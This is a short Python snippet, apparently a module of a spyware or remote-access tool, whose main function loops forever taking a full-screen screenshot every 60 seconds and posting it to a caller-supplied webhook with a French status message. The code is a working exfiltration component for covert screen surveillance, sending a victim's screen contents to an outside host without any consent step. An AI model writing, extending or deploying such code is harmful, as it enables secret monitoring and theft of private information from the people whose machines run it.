import os

def clear():
    os.system("cls")



from PIL import ImageGrab
import io
import requests
import time

def screenshot_option_func(webhook):
    while True:
        im = ImageGrab.grab()
        buffer = io.BytesIO()
        im.save(buffer, format="PNG")
        buffer.seek(0)
        files = {'file': ('screenshot.png', buffer, 'image/png')}
        message = "Screenshot envoyé"
        requests.post(webhook, data={"content": message}, files=files)
        time.sleep(60)